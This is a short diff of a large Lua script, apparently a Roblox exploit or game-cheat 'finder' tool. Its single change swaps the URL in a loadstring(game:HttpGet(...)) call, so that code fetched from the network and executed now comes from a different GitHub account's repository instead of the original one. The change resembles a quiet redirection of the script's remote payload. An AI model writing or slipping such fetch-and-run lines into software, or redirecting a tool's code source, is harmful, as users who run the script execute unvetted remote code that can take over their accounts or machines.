@@ -16434,7 +16434,7 @@ if not globals.__n4thFinderBooting then
             and os.time() - data.At >= 0 and os.time() - data.At < 600
             and stoppedAt < data.At - 3 then
             ran, err = pcall(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/ZennJxD/n4th/refs/heads/main/n4th"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/farelfirmansyah323-dot/growbloxcit/refs/heads/main/main"))()
             end)
         elseif ok and type(data) == "table" and data.Active == true and player and stoppedAt >= (tonumber(data.At) or 0) - 3 then
             pcall(ts.SetTeleportSetting, ts, "n4th.finder.teleport.v1", { Schema = 1, Active = false, Cancelled = true, At = os.time(), User = player.UserId })
